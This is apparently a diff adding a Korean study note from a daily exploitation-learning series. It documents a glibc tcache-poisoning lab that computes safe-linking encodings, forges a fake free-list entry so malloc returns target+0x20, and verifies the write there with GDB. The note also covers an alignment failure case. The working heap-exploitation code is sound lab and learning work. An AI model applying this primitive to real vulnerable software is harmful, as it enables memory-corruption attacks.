@@ -1,0 +1,325 @@
+# Day072 — Tcache Poisoning 2: Controlled Allocation
+
+## 1. 목표
+
+Day071에서는 tcache `next`를 조작해 특정 전역 배열의 시작 주소를 `malloc` 반환값으로 유도했다.
+
+Day072에서는 이를 확장해 전역 객체의 시작 주소가 아니라, 객체 내부의 특정 offset인 `target + 0x20`을 반환받는 controlled allocation을 검증했다.
+
+검증 목표는 다음과 같다.
+
+```text
+tcache[0x40] : a -> b
+        ↓ poisoning
+tcache[0x40] : a -> target+0x20
+        ↓ malloc #1
+p == a
+        ↓ malloc #2
+q == target+0x20
+        ↓ write
+target+0x20 raw memory 변경
+```
+
+---
+
+## 2. 핵심 코드
+
+```c
+uintptr_t goal = (uintptr_t)(target + 0x20);
+
+uintptr_t encoded_goal =
+    goal ^ ((uintptr_t)a >> 12);
+
+*(uintptr_t *)a = encoded_goal;
+
+*(uintptr_t *)goal = goal >> 12;
+```
+
+`a`의 실제 next를 `goal`로 만들기 위해 safe-linking 값을 계산한다.
+
+```text
+stored_next = actual_next ^ (storage_position >> 12)
+
+encoded_goal = goal ^ (a >> 12)
+```
+
+여기서 저장 위치는 `a`이므로 `a >> 12`를 사용한다.
+
+fake tcache entry가 되는 `goal`의 next는 NULL이어야 한다.
+
+```text
+encoded_NULL
+= 0 ^ (goal >> 12)
+= goal >> 12
+```
+
+따라서 다음 값을 `goal` 위치에 저장한다.
+
+```c
+*(uintptr_t *)goal = goal >> 12;
+```
+
+glibc가 이를 복호화하면 다음과 같다.
+
+```text
+decoded_next
+= (goal >> 12) ^ (goal >> 12)
+= 0
+```
+
+결과적으로 allocator는 `goal->next == NULL`로 해석한다.
+
+---
+
+## 3. 초기 상태
+
+같은 size class의 chunk 두 개를 할당한 뒤 다음 순서로 free했다.
+
+```c
+free(b);
+free(a);
+```
+
+tcache 상태:
+
+```text
+tcache[0x40] -> a -> b -> NULL
+```
+
+raw memory에서 `a`의 첫 8바이트는 safe-linking으로 인코딩된 `b` 주소를 가진다.
+
+---
+
+## 4. Poisoning 이후 상태
+
+다음 코드를 실행했다.
+
+```c
+*(uintptr_t *)a = encoded_goal;
+```
+
+이후 tcache 상태:
+
+```text
+tcache[0x40] -> a -> goal -> NULL
+```
+
+여기서 `goal`은 다음 주소다.
+
+```text
+goal = target + 0x20
+```
+
+기존에 연결돼 있던 `b`는 메모리에 남아 있지만, 조작된 free list에서는 더 이상 도달할 수 없다.
+
+---
+
+## 5. Allocation 결과
+
+같은 size class로 두 번 할당했다.
+
+```c
+char *p = malloc(0x30);
+char *q = malloc(0x30);
+```
+
+첫 번째 할당:
+
+```text
+p == a
+```
+
+첫 번째 `malloc` 이후:
+
+```text
+tcache[0x40] -> goal -> NULL
+```
+
+두 번째 할당:
+
+```text
+q == goal
+q == target + 0x20
+```
+
+두 번째 `malloc` 이후 해당 tcache bin은 비게 된다.
+
+```text
+tcache[0x40] -> empty
+```
+
+이를 통해 allocator의 free list를 조작해 특정 주소를 반환받는 controlled allocation primitive를 확인했다.
+
+---
+
+## 6. Write 검증
+
+반환된 포인터 `q`를 이용해 다음 write를 수행했다.
+
+```c
+memset(q, 'A', 8);
+```
+
+실행 전 `goal`의 raw memory에는 encoded NULL 값이 있었다.
+
+```text
+goal >> 12
+```
+
+실행 후에는 다음 값으로 바뀌었다.
+
+```text
+0x4141414141414141
+```
+
+즉 다음 두 조건을 모두 확인했다.
+
+```text
+q == target + 0x20
+```
+
+```text
+*(uint64_t *)(target + 0x20)
+== 0x4141414141414141
+```
+
+따라서 controlled allocation뿐 아니라, 반환 포인터를 통한 targeted write까지 검증했다.
+
+---
+
+## 7. GDB 검증 기준
+
+Poisoning 전:
+
+```gdb
+tcachebins
+x/2gx a
+```
+
+예상 상태:
+
+```text
+a -> b -> NULL
+```
+
+Poisoning 후:
+
+```gdb
+tcachebins
+x/2gx a
+x/2gx goal
+```
+
+예상 상태:
+
+```text
+a -> goal -> NULL
+```
+
+첫 번째 `malloc` 이후:
+
+```gdb
+p/x p
+tcachebins
+```
+
+예상 결과:
+
+```text
+p == a
+goal -> NULL
+```
+
+두 번째 `malloc` 이후:
+
+```gdb
+p/x q
+p/x goal
+tcachebins
+```
+
+예상 결과:
+
+```text
+q == goal
+tcache[0x40] empty
+```
+
+Write 전후:
+
+```gdb
+x/gx goal
+next
+x/gx goal
+```
+
+예상 변화:
+
+```text
+goal >> 12
+→
+0x4141414141414141
+```
+
+---
+
+## 8. 실패 케이스
+
+`goal`을 다음처럼 바꿨다.
+
+```c
+goal = (uintptr_t)(target + 0x18);
+```
+
+`target`이 16바이트 정렬돼 있더라도 `0x18`은 16의 배수가 아니다.
+
+```text
+(target + 0x18) % 16 = 8
+```
+
+따라서 poisoned entry가 16바이트 정렬을 만족하지 않는다.
+
+glibc가 해당 entry를 꺼내려 할 때 다음과 같은 오류로 abort할 수 있다.
+
+```text
+malloc(): unaligned tcache chunk detected
+```
+
+즉 safe-linking 값을 올바르게 계산했더라도 반환 후보 주소가 allocator의 정렬 조건을 만족하지 않으면 controlled allocation은 실패한다.
+
+---
+
+## 9. Root Cause
+
+근본 원인은 free된 chunk의 user area에 저장된 allocator metadata를 UAF write로 수정할 수 있다는 점이다.
+
+tcache는 freed chunk의 첫 8바이트를 다음 entry를 나타내는 encoded pointer로 사용한다.
+
+```text
+freed chunk user area
++0x00 : encoded next
++0x08 : tcache key
+```
+
+공격자가 `encoded next`를 조작하면 allocator가 신뢰하는 free list가 변한다.
+
+```text
+free-list pointer overwrite
+→ allocator 상태 조작
+→ 다음 malloc 반환 주소 변경
+→ controlled allocation
+```
+
+---
+
+## 10. 결론
+
+Day072에서는 tcache poisoning을 이용해 단순히 전역 배열 시작 주소가 아니라, 전역 객체 내부의 특정 offset인 `target + 0x20`으로 `malloc` 반환값을 유도했다.
+
+다음 세 가지를 교차검증했다.
+
+1. `tcachebins`에서 `a -> target+0x20` 체인 확인
+2. 두 번째 `malloc`에서 `q == target+0x20` 확인
+3. `q`를 통한 write가 해당 raw memory에 반영되는지 확인
+
+이번 실습은 하나의 정해진 목표 주소로 반환을 유도했으므로 arbitrary allocation보다는 controlled allocation이라고 부르는 것이 정확하다.
